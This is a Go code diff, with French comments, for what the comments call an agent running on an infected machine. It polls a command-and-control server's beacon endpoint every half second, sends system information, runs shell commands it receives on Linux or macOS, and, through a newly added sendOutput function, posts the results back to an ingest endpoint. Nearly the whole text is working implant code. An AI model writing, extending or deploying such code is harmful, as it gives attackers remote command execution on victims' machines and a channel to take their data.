@@ -33,10 +33,11 @@ func main() {
 	for i := 1; ; i++ {
 		info := gatherSystemInfo() // Pourquoi récuperer a chaque fois les infos ? -> TODO a des fins de logging : à persister dans les logs
 
-		cmd := sendBeacon(serverURL+"/beacon", info) // l'endpoint beacon servirait donc de point de recuperation des commandes a executer ?
+		cmd := retrieveCommands(serverURL+"/beacon", info) // l'endpoint beacon servirait donc de point de recuperation des commandes a executer ?
 
 		if cmd != nil && cmd.Action != "" { // Si il y a une commande valide
-			executeCommand(cmd)
+			res := executeCommand(cmd)
+			sendOutput(serverURL+"/ingest", res)
 		}
 
 		time.Sleep(500 * time.Millisecond)
@@ -81,7 +82,7 @@ func gatherSystemInfo() shared.AgentInfo {
 	}
 }
 
-func sendBeacon(url string, info shared.AgentInfo) *shared.Command {
+func retrieveCommands(url string, info shared.AgentInfo) *shared.Command {
 	serializedAgentInfo, _ := json.Marshal(info) // Serialise en JSON les informations de la machine infecté par l'agent
 
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(serializedAgentInfo))
@@ -101,7 +102,7 @@ func sendBeacon(url string, info shared.AgentInfo) *shared.Command {
 	return nil
 }
 
-func executeCommand(cmd *shared.Command) {
+func executeCommand(cmd *shared.Command) string {
 	switch cmd.Action {
 	case "shell":
 		if cmd.Payload != "" {
@@ -114,9 +115,9 @@ func executeCommand(cmd *shared.Command) {
 
 				if err != nil {
 					output = fmt.Sprintf("Erreur: %v", err)
-				} else {
-					output = string(result)
+					return output
 				}
+				output = string(result)
 			}
 
 			if runtime.GOOS == "darwin" { // SI Macos
@@ -124,12 +125,13 @@ func executeCommand(cmd *shared.Command) {
 
 				if err != nil {
 					output = fmt.Sprintf("Erreur: %v", err)
-				} else {
-					output = string(result)
+					return output
 				}
+				output = string(result)
 			}
 
-			fmt.Printf(output) // Print paylaod output
+			fmt.Printf(output)
+			return output
 		}
 
 	case "info":
@@ -148,5 +150,25 @@ func executeCommand(cmd *shared.Command) {
 
 	default:
 		fmt.Printf("Commande inconnue: %s\n", cmd.Action)
+	}
+
+	return ""
+}
+
+func sendOutput(url string, output string) {
+	serializedOutput, _ := json.Marshal(output)
+
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(serializedOutput))
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	var result string
+
+	if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
+		if result != "" {
+			fmt.Printf(result)
+		}
 	}
 }
